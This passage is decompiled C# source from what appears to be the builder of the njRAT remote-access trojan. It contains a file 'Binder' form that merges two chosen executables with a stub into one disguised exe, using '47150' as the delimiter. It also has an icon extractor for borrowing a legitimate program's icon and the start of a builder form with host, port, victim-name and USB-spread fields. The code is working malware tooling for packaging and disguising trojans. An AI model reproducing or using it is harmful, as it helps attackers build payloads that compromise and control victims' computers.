			arg_7D9_0.Location = location;
			this.PictureBox1.Name = "PictureBox1";
			Control arg_804_0 = this.PictureBox1;
			size = new Size(100, 50);
			arg_804_0.Size = size;
			this.PictureBox1.TabIndex = 79;
			this.PictureBox1.TabStop = false;
			this.Button10.BackColor = Color.FromArgb(54, 54, 54);
			this.Button10.FlatStyle = FlatStyle.Flat;
			this.Button10.ForeColor = Color.Black;
			this.Button10.Image = (Image)componentResourceManager.GetObject("Button10.Image");
			Control arg_88C_0 = this.Button10;
			location = new Point(219, 52);
			arg_88C_0.Location = location;
			this.Button10.Name = "Button10";
			Control arg_8B7_0 = this.Button10;
			size = new Size(29, 23);
			arg_8B7_0.Size = size;
			this.Button10.TabIndex = 78;
			this.Button10.Text = ".";
			this.Button10.UseVisualStyleBackColor = false;
			this.Button8.BackColor = Color.FromArgb(54, 54, 54);
			this.Button8.FlatStyle = FlatStyle.Flat;
			this.Button8.ForeColor = Color.Black;
			this.Button8.Image = (Image)componentResourceManager.GetObject("Button8.Image");
			Control arg_950_0 = this.Button8;
			location = new Point(219, 33);
			arg_950_0.Location = location;
			this.Button8.Name = "Button8";
			Control arg_97B_0 = this.Button8;
			size = new Size(29, 23);
			arg_97B_0.Size = size;
			this.Button8.TabIndex = 77;
			this.Button8.Text = ".";
			this.Button8.UseVisualStyleBackColor = false;
			this.Button6.BackColor = Color.FromArgb(54, 54, 54);
			this.Button6.FlatStyle = FlatStyle.Flat;
			this.Button6.ForeColor = Color.Black;
			this.Button6.Image = (Image)componentResourceManager.GetObject("Button6.Image");
			Control arg_A13_0 = this.Button6;
			location = new Point(219, 6);
			arg_A13_0.Location = location;
			this.Button6.Name = "Button6";
			Control arg_A3E_0 = this.Button6;
			size = new Size(29, 23);
			arg_A3E_0.Size = size;
			this.Button6.TabIndex = 76;
			this.Button6.Text = ".";
			this.Button6.UseVisualStyleBackColor = false;
			this.Button3.BackColor = Color.FromArgb(54, 54, 54);
			this.Button3.FlatStyle = FlatStyle.Flat;
			this.Button3.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Button3.ForeColor = Color.Black;
			Control arg_AD9_0 = this.Button3;
			location = new Point(247, 53);
			arg_AD9_0.Location = location;
			this.Button3.Name = "Button3";
			Control arg_B04_0 = this.Button3;
			size = new Size(101, 23);
			arg_B04_0.Size = size;
			this.Button3.TabIndex = 75;
			this.Button3.Text = " Icon";
			this.Button3.UseVisualStyleBackColor = false;
			this.Button1.BackColor = Color.FromArgb(54, 54, 54);
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Button1.ForeColor = Color.Black;
			Control arg_B9F_0 = this.Button1;
			location = new Point(245, 33);
			arg_B9F_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_BCA_0 = this.Button1;
			size = new Size(103, 23);
			arg_BCA_0.Size = size;
			this.Button1.TabIndex = 74;
			this.Button1.Text = "Binded";
			this.Button1.UseVisualStyleBackColor = false;
			this.Button2.BackColor = Color.FromArgb(54, 54, 54);
			this.Button2.FlatStyle = FlatStyle.Flat;
			this.Button2.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Button2.ForeColor = Color.Black;
			Control arg_C64_0 = this.Button2;
			location = new Point(245, 6);
			arg_C64_0.Location = location;
			this.Button2.Name = "Button2";
			Control arg_C8F_0 = this.Button2;
			size = new Size(103, 23);
			arg_C8F_0.Size = size;
			this.Button2.TabIndex = 73;
			this.Button2.Text = "Select Exe";
			this.Button2.UseVisualStyleBackColor = false;
			this.LogInRichTextBox6.BackColor = Color.FromArgb(54, 54, 54);
			this.LogInRichTextBox6.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogInRichTextBox6.BorderColour = Color.FromArgb(35, 35, 35);
			Control arg_D18_0 = this.LogInRichTextBox6;
			location = new Point(6, 33);
			arg_D18_0.Location = location;
			this.LogInRichTextBox6.Name = "LogInRichTextBox6";
			Control arg_D46_0 = this.LogInRichTextBox6;
			size = new Size(207, 42);
			arg_D46_0.Size = size;
			this.LogInRichTextBox6.TabIndex = 72;
			this.LogInRichTextBox6.TextColour = Color.FromArgb(255, 255, 255);
			this.LogInRichTextBox5.BackColor = Color.FromArgb(54, 54, 54);
			this.LogInRichTextBox5.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogInRichTextBox5.BorderColour = Color.FromArgb(35, 35, 35);
			Control arg_DD0_0 = this.LogInRichTextBox5;
			location = new Point(6, 6);
			arg_DD0_0.Location = location;
			this.LogInRichTextBox5.Name = "LogInRichTextBox5";
			Control arg_DFE_0 = this.LogInRichTextBox5;
			size = new Size(207, 34);
			arg_DFE_0.Size = size;
			this.LogInRichTextBox5.TabIndex = 71;
			this.LogInRichTextBox5.TextColour = Color.FromArgb(255, 255, 255);
			this.NsOnOffBox1.Checked = false;
			Control arg_E58_0 = this.NsOnOffBox1;
			location = new Point(393, 171);
			arg_E58_0.Location = location;
			Control arg_E72_0 = this.NsOnOffBox1;
			size = new Size(56, 24);
			arg_E72_0.MaximumSize = size;
			Control arg_E8C_0 = this.NsOnOffBox1;
			size = new Size(56, 24);
			arg_E8C_0.MinimumSize = size;
			this.NsOnOffBox1.Name = "NsOnOffBox1";
			Control arg_EB7_0 = this.NsOnOffBox1;
			size = new Size(56, 24);
			arg_EB7_0.Size = size;
			this.NsOnOffBox1.TabIndex = 59;
			this.NsOnOffBox1.Text = "NsOnOffBox1";
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(350, 105);
			this.ClientSize = size;
			this.Controls.Add(this.Button9);
			this.Controls.Add(this.LogInRichTextBox2);
			this.Controls.Add(this.Button5);
			this.Controls.Add(this.LogInRichTextBox1);
			this.Controls.Add(this.LogInTabControl1);
			this.Controls.Add(this.NsOnOffBox1);
			this.ForeColor = Color.LightSteelBlue;
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			size = new Size(366, 139);
			this.MaximumSize = size;
			size = new Size(366, 139);
			this.MinimumSize = size;
			this.Name = "Form6";
			this.Text = "Binded";
			this.LogInTabControl1.ResumeLayout(false);
			this.TabPage2.ResumeLayout(false);
			this.TabPage2.PerformLayout();
			((ISupportInitialize)this.PictureBox1).EndInit();
			this.ResumeLayout(false);
		}

		private void Button2_Click(object sender, EventArgs e)
		{
		}

		private void Button1_Click(object sender, EventArgs e)
		{
		}

		private void Button2_Click_1(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "";
			openFileDialog.Filter = "*.exe | *.exe";
			openFileDialog.Title = "File 1";
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				this.LogInRichTextBox5.Text = openFileDialog.FileName;
			}
			openFileDialog.Title = "File 2";
			flag = (openFileDialog.ShowDialog() == DialogResult.OK);
			if (flag)
			{
				this.LogInRichTextBox6.Text = openFileDialog.FileName;
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private void Button1_Click_1(object sender, EventArgs e)
		{
			FileSystem.FileOpen(1, this.LogInRichTextBox5.Text, OpenMode.Binary, OpenAccess.Read, OpenShare.Default, -1);
			checked
			{
				string text = Strings.Space((int)FileSystem.LOF(1));
				FileSystem.FileGet(1, ref text, -1L, false);
				FileSystem.FileClose(new int[]
				{
					1
				});
				FileSystem.FileOpen(2, this.LogInRichTextBox6.Text, OpenMode.Binary, OpenAccess.Read, OpenShare.Default, -1);
				string text2 = Strings.Space((int)FileSystem.LOF(2));
				FileSystem.FileGet(2, ref text2, -1L, false);
				FileSystem.FileClose(new int[]
				{
					2
				});
				FileSystem.FileOpen(3, Application.StartupPath + "\\Stub\\Stub'.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default, -1);
				string text3 = Strings.Space((int)FileSystem.LOF(3));
				FileSystem.FileGet(3, ref text3, -1L, false);
				FileSystem.FileClose(new int[]
				{
					3
				});
				SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.Filter = "*.exe | *.exe";
				bool flag = saveFileDialog.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					string fileName = saveFileDialog.FileName;
					string text4 = this.LogInRichTextBox5.Text.Substring(this.LogInRichTextBox5.Text.LastIndexOf("\\"));
					string text5 = this.LogInRichTextBox6.Text.Substring(this.LogInRichTextBox6.Text.LastIndexOf("\\"));
					FileSystem.FileOpen(3, fileName, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default, -1);
					FileSystem.FilePut(3, string.Concat(new string[]
					{
						text3,
						"47150",
						text,
						"47150",
						text2,
						"47150",
						text4,
						"47150",
						text5
					}), -1L, false);
					FileSystem.FileClose(new int[]
					{
						3
					});
				}
			}
		}

		private void Form6_Load(object sender, EventArgs e)
		{
			this.Text = "Binded " + Environment.MachineName + "\\@" + Environment.UserName;
			try
			{
				string empty = string.Empty;
				string[] array = Strings.Split(empty, "\r\n", -1, CompareMethod.Binary);
			}
			catch (Exception expr_38)
			{
				ProjectData.SetProjectError(expr_38);
				ProjectData.ClearProjectError();
			}
			checked
			{
				this.Top = Screen.PrimaryScreen.WorkingArea.Height - this.Width - 90;
				this.Left = Screen.PrimaryScreen.WorkingArea.Width - this.Width - 350;
			}
		}

		private void Button3_Click(object sender, EventArgs e)
		{
			MyProject.Forms.Form5.Show();
			this.Hide();
		}

		private string File()
		{
			string result;
			return result;
		}

		private void File(bool p1)
		{
		}

		private void Button2_Click_2(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "";
			openFileDialog.Filter = "*.exe | *.exe";
			openFileDialog.Title = "File 1";
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				this.LogInRichTextBox5.Text = openFileDialog.FileName;
			}
			openFileDialog.Title = "File 2";
			flag = (openFileDialog.ShowDialog() == DialogResult.OK);
			if (flag)
			{
				this.LogInRichTextBox6.Text = openFileDialog.FileName;
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private void Button1_Click_2(object sender, EventArgs e)
		{
			FileSystem.FileOpen(1, this.LogInRichTextBox5.Text, OpenMode.Binary, OpenAccess.Read, OpenShare.Default, -1);
			checked
			{
				string text = Strings.Space((int)FileSystem.LOF(1));
				FileSystem.FileGet(1, ref text, -1L, false);
				FileSystem.FileClose(new int[]
				{
					1
				});
				FileSystem.FileOpen(2, this.LogInRichTextBox6.Text, OpenMode.Binary, OpenAccess.Read, OpenShare.Default, -1);
				string text2 = Strings.Space((int)FileSystem.LOF(2));
				FileSystem.FileGet(2, ref text2, -1L, false);
				FileSystem.FileClose(new int[]
				{
					2
				});
				FileSystem.FileOpen(3, Application.StartupPath + "\\Stub\\STUB.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default, -1);
				string text3 = Strings.Space((int)FileSystem.LOF(3));
				FileSystem.FileGet(3, ref text3, -1L, false);
				FileSystem.FileClose(new int[]
				{
					3
				});
				SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.Filter = "*.exe | *.exe";
				bool flag = saveFileDialog.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					string fileName = saveFileDialog.FileName;
					string text4 = this.LogInRichTextBox5.Text.Substring(this.LogInRichTextBox5.Text.LastIndexOf("\\"));
					string text5 = this.LogInRichTextBox6.Text.Substring(this.LogInRichTextBox6.Text.LastIndexOf("\\"));
					FileSystem.FileOpen(3, fileName, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default, -1);
					FileSystem.FilePut(3, string.Concat(new string[]
					{
						text3,
						"47150",
						text,
						"47150",
						text2,
						"47150",
						text4,
						"47150",
						text5
					}), -1L, false);
					FileSystem.FileClose(new int[]
					{
						3
					});
					MyProject.Forms.NOTIF.ShowDialog();
					Interaction.MsgBox("File Builded To\r\n" + this.FileName(), MsgBoxStyle.Information, "DONE!");
					this.Close();
				}
			}
		}

		private void Button4_Click(object sender, EventArgs e)
		{
		}

		private void Button5_Click(object sender, EventArgs e)
		{
		}

		private void Button7_Click(object sender, EventArgs e)
		{
		}

		private void Button5_Click_1(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = this.OpenFileDialog1;
			openFileDialog.FileName = "Icon";
			openFileDialog.Filter = "Icon (*.ico)|*.ico";
			openFileDialog.Title = "Browse...";
			openFileDialog.ShowDialog();
			this.LogInRichTextBox6.Text = openFileDialog.FileName;
			Icon icon = new Icon(openFileDialog.FileName);
			Bitmap image = new Bitmap(icon.ToBitmap());
			this.PictureBox1.Image = image;
		}

		private string FileName()
		{
			string result;
			return result;
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using nj.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Form7 : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("LogInTitledListBox1")]
		private LogInTitledListBox _LogInTitledListBox1;

		[AccessedThroughProperty("LogInRichTextBox1")]
		private LogInRichTextBox _LogInRichTextBox1;

		[AccessedThroughProperty("Button4")]
		private Button _Button4;

		[AccessedThroughProperty("Button5")]
		private Button _Button5;

		[AccessedThroughProperty("Button7")]
		private Button _Button7;

		[AccessedThroughProperty("LogInRichTextBox2")]
		private LogInRichTextBox _LogInRichTextBox2;

		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		[AccessedThroughProperty("OpenFileDialog1")]
		private OpenFileDialog _OpenFileDialog1;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		[AccessedThroughProperty("Button3")]
		private Button _Button3;

		internal virtual LogInTitledListBox LogInTitledListBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInTitledListBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInTitledListBox1 = value;
			}
		}

		internal virtual LogInRichTextBox LogInRichTextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInRichTextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInRichTextBox1 = value;
			}
		}

		internal virtual Button Button4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button4_Click);
				bool flag = this._Button4 != null;
				if (flag)
				{
					this._Button4.Click -= value2;
				}
				this._Button4 = value;
				flag = (this._Button4 != null);
				if (flag)
				{
					this._Button4.Click += value2;
				}
			}
		}

		internal virtual Button Button5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button5_Click);
				bool flag = this._Button5 != null;
				if (flag)
				{
					this._Button5.Click -= value2;
				}
				this._Button5 = value;
				flag = (this._Button5 != null);
				if (flag)
				{
					this._Button5.Click += value2;
				}
			}
		}

		internal virtual Button Button7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button7_Click);
				bool flag = this._Button7 != null;
				if (flag)
				{
					this._Button7.Click -= value2;
				}
				this._Button7 = value;
				flag = (this._Button7 != null);
				if (flag)
				{
					this._Button7.Click += value2;
				}
			}
		}

		internal virtual LogInRichTextBox LogInRichTextBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInRichTextBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInRichTextBox2 = value;
			}
		}

		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox1 = value;
			}
		}

		internal virtual OpenFileDialog OpenFileDialog1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenFileDialog1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._OpenFileDialog1 = value;
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button1 = value;
			}
		}

		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click);
				bool flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				flag = (this._Button2 != null);
				if (flag)
				{
					this._Button2.Click += value2;
				}
			}
		}

		internal virtual Button Button3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button3 = value;
			}
		}

		[DebuggerNonUserCode]
		public Form7()
		{
			base.Load += new EventHandler(this.Form1_Load);
			Form7.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Form7.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Form7.__ENCList.Count == Form7.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Form7.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Form7.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Form7.__ENCList[num] = Form7.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Form7.__ENCList.RemoveRange(num, Form7.__ENCList.Count - num);
						Form7.__ENCList.Capacity = Form7.__ENCList.Count;
					}
					Form7.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form7));
			this.Button4 = new Button();
			this.Button5 = new Button();
			this.Button7 = new Button();
			this.PictureBox1 = new PictureBox();
			this.OpenFileDialog1 = new OpenFileDialog();
			this.Button1 = new Button();
			this.Button2 = new Button();
			this.Button3 = new Button();
			this.LogInRichTextBox2 = new LogInRichTextBox();
			this.LogInRichTextBox1 = new LogInRichTextBox();
			this.LogInTitledListBox1 = new LogInTitledListBox();
			((ISupportInitialize)this.PictureBox1).BeginInit();
			this.SuspendLayout();
			this.Button4.BackColor = Color.FromArgb(54, 54, 54);
			this.Button4.FlatStyle = FlatStyle.Flat;
			this.Button4.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Button4.ForeColor = Color.Black;
			Control arg_111_0 = this.Button4;
			Point location = new Point(155, 16);
			arg_111_0.Location = location;
			this.Button4.Name = "Button4";
			Control arg_13C_0 = this.Button4;
			Size size = new Size(86, 23);
			arg_13C_0.Size = size;
			this.Button4.TabIndex = 111;
			this.Button4.Text = "Select Exe";
			this.Button4.UseVisualStyleBackColor = false;
			this.Button5.BackColor = Color.FromArgb(54, 54, 54);
			this.Button5.FlatStyle = FlatStyle.Flat;
			this.Button5.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Button5.ForeColor = Color.Black;
			Control arg_1D7_0 = this.Button5;
			location = new Point(155, 45);
			arg_1D7_0.Location = location;
			this.Button5.Name = "Button5";
			Control arg_202_0 = this.Button5;
			size = new Size(86, 23);
			arg_202_0.Size = size;
			this.Button5.TabIndex = 112;
			this.Button5.Text = "Select Ico";
			this.Button5.UseVisualStyleBackColor = false;
			this.Button7.BackColor = Color.FromArgb(54, 54, 54);
			this.Button7.FlatStyle = FlatStyle.Flat;
			this.Button7.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Button7.ForeColor = Color.Black;
			Control arg_29D_0 = this.Button7;
			location = new Point(133, 74);
			arg_29D_0.Location = location;
			this.Button7.Name = "Button7";
			Control arg_2C8_0 = this.Button7;
			size = new Size(55, 23);
			arg_2C8_0.Size = size;
			this.Button7.TabIndex = 113;
			this.Button7.Text = "Change";
			this.Button7.UseVisualStyleBackColor = false;
			Control arg_30D_0 = this.PictureBox1;
			location = new Point(24, 29);
			arg_30D_0.Location = location;
			this.PictureBox1.Name = "PictureBox1";
			Control arg_338_0 = this.PictureBox1;
			size = new Size(88, 47);
			arg_338_0.Size = size;
			this.PictureBox1.TabIndex = 115;
			this.PictureBox1.TabStop = false;
			this.OpenFileDialog1.FileName = "OpenFileDialog1";
			this.Button1.BackColor = Color.FromArgb(54, 54, 54);
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.ForeColor = Color.Black;
			this.Button1.Image = (Image)componentResourceManager.GetObject("Button1.Image");
			Control arg_3D1_0 = this.Button1;
			location = new Point(133, 45);
			arg_3D1_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_3FC_0 = this.Button1;
			size = new Size(29, 23);
			arg_3FC_0.Size = size;
			this.Button1.TabIndex = 122;
			this.Button1.Text = ".";
			this.Button1.UseVisualStyleBackColor = false;
			this.Button2.BackColor = Color.FromArgb(54, 54, 54);
			this.Button2.FlatStyle = FlatStyle.Flat;
			this.Button2.ForeColor = Color.Black;
			Control arg_479_0 = this.Button2;
			location = new Point(183, 74);
			arg_479_0.Location = location;
			this.Button2.Name = "Button2";
			Control arg_4A4_0 = this.Button2;
			size = new Size(58, 23);
			arg_4A4_0.Size = size;
			this.Button2.TabIndex = 121;
			this.Button2.Text = "Binded";
			this.Button2.UseVisualStyleBackColor = false;
			this.Button3.BackColor = Color.FromArgb(54, 54, 54);
			this.Button3.FlatStyle = FlatStyle.Flat;
			this.Button3.ForeColor = Color.Black;
			this.Button3.Image = (Image)componentResourceManager.GetObject("Button3.Image");
			Control arg_53D_0 = this.Button3;
			location = new Point(133, 16);
			arg_53D_0.Location = location;
			this.Button3.Name = "Button3";
			Control arg_568_0 = this.Button3;
			size = new Size(29, 23);
			arg_568_0.Size = size;
			this.Button3.TabIndex = 120;
			this.Button3.Text = ".";
			this.Button3.UseVisualStyleBackColor = false;
			this.LogInRichTextBox2.BackColor = Color.FromArgb(54, 54, 54);
			this.LogInRichTextBox2.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogInRichTextBox2.BorderColour = Color.FromArgb(35, 35, 35);
			this.LogInRichTextBox2.ForeColor = Color.LightSteelBlue;
			Control arg_606_0 = this.LogInRichTextBox2;
			location = new Point(12, 213);
			arg_606_0.Location = location;
			this.LogInRichTextBox2.Name = "LogInRichTextBox2";
			Control arg_634_0 = this.LogInRichTextBox2;
			size = new Size(207, 42);
			arg_634_0.Size = size;
			this.LogInRichTextBox2.TabIndex = 114;
			this.LogInRichTextBox2.TextColour = Color.FromArgb(255, 255, 255);
			this.LogInRichTextBox1.BackColor = Color.FromArgb(54, 54, 54);
			this.LogInRichTextBox1.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogInRichTextBox1.BorderColour = Color.FromArgb(35, 35, 35);
			this.LogInRichTextBox1.ForeColor = Color.LightSteelBlue;
			Control arg_6D1_0 = this.LogInRichTextBox1;
			location = new Point(12, 16);
			arg_6D1_0.Location = location;
			this.LogInRichTextBox1.Name = "LogInRichTextBox1";
			Control arg_6FC_0 = this.LogInRichTextBox1;
			size = new Size(115, 73);
			arg_6FC_0.Size = size;
			this.LogInRichTextBox1.TabIndex = 110;
			this.LogInRichTextBox1.TextColour = Color.FromArgb(255, 255, 255);
			this.LogInTitledListBox1.BackColor = Color.Black;
			this.LogInTitledListBox1.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogInTitledListBox1.BorderColour = Color.FromArgb(35, 35, 35);
			this.LogInTitledListBox1.Items = new string[]
			{
				""
			};
			this.LogInTitledListBox1.ListBaseColour = Color.FromArgb(47, 47, 47);
			Control arg_7B9_0 = this.LogInTitledListBox1;
			location = new Point(-11, -43);
			arg_7B9_0.Location = location;
			this.LogInTitledListBox1.Name = "LogInTitledListBox1";
			this.LogInTitledListBox1.SelectedColour = Color.FromArgb(55, 55, 55);
			Control arg_801_0 = this.LogInTitledListBox1;
			size = new Size(264, 161);
			arg_801_0.Size = size;
			this.LogInTitledListBox1.TabIndex = 0;
			this.LogInTitledListBox1.Text = "*";
			this.LogInTitledListBox1.TextColour = Color.WhiteSmoke;
			this.LogInTitledListBox1.TitleFont = new Font("Microsoft Sans Serif", 10f, FontStyle.Bold);
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.FromArgb(64, 64, 64);
			size = new Size(245, 101);
			this.ClientSize = size;
			this.Controls.Add(this.Button1);
			this.Controls.Add(this.Button2);
			this.Controls.Add(this.Button3);
			this.Controls.Add(this.PictureBox1);
			this.Controls.Add(this.LogInRichTextBox2);
			this.Controls.Add(this.Button7);
			this.Controls.Add(this.Button5);
			this.Controls.Add(this.Button4);
			this.Controls.Add(this.LogInRichTextBox1);
			this.Controls.Add(this.LogInTitledListBox1);
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			size = new Size(261, 135);
			this.MaximumSize = size;
			size = new Size(261, 135);
			this.MinimumSize = size;
			this.Name = "Form7";
			this.Text = "Ico Extractor";
			((ISupportInitialize)this.PictureBox1).EndInit();
			this.ResumeLayout(false);
		}

		private void Button4_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			OpenFileDialog openFileDialog2 = openFileDialog;
			openFileDialog2.Title = "Open File";
			openFileDialog2.FileName = "";
			openFileDialog2.Filter = "All Files|*.*";
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				Icon icon = Icon.ExtractAssociatedIcon(openFileDialog.FileName);
				this.PictureBox1.BackgroundImage = icon.ToBitmap();
				this.PictureBox1.BackgroundImageLayout = ImageLayout.Zoom;
			}
		}

		private void Button5_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			SaveFileDialog saveFileDialog2 = saveFileDialog;
			saveFileDialog2.Title = "Save Icon";
			saveFileDialog2.FileName = "";
			saveFileDialog2.Filter = "Icon|*.Icon";
			bool flag = saveFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				this.PictureBox1.BackgroundImage.Save(saveFileDialog.FileName, ImageFormat.Png);
			}
			MessageBox.Show("Icon Has been Extract", "Success", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		private void Form1_Load(object sender, EventArgs e)
		{
			this.Text = "Ico Extractor: " + Environment.MachineName + "\\@" + Environment.UserName;
			try
			{
				string empty = string.Empty;
				string[] array = Strings.Split(empty, "\r\n", -1, CompareMethod.Binary);
			}
			catch (Exception expr_38)
			{
				ProjectData.SetProjectError(expr_38);
				ProjectData.ClearProjectError();
			}
			checked
			{
				this.Top = Screen.PrimaryScreen.WorkingArea.Height - this.Width - 90;
				this.Left = Screen.PrimaryScreen.WorkingArea.Width - this.Width - 350;
			}
		}

		private void Button7_Click(object sender, EventArgs e)
		{
			MyProject.Forms.Form5.Show();
		}

		private void Button2_Click(object sender, EventArgs e)
		{
			MyProject.Forms.Form6.Show();
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Mono.Collections.Generic;
using nj.Coringa;
using nj.My.Resources;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Frm_Builder : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("T1")]
		private TextBox _T1;

		[AccessedThroughProperty("rnz")]
		private CheckBox _rnz;

		[AccessedThroughProperty("US")]
		private CheckBox _US;

		[AccessedThroughProperty("Label5")]
		private Label _Label5;

		[AccessedThroughProperty("Label4")]
		private Label _Label4;

		[AccessedThroughProperty("VN")]
		private TextBox _VN;

		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		[AccessedThroughProperty("port")]
		private NumericUpDown _port;

		[AccessedThroughProperty("host")]
		private TextBox _host;

		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		[AccessedThroughProperty("Label1")]
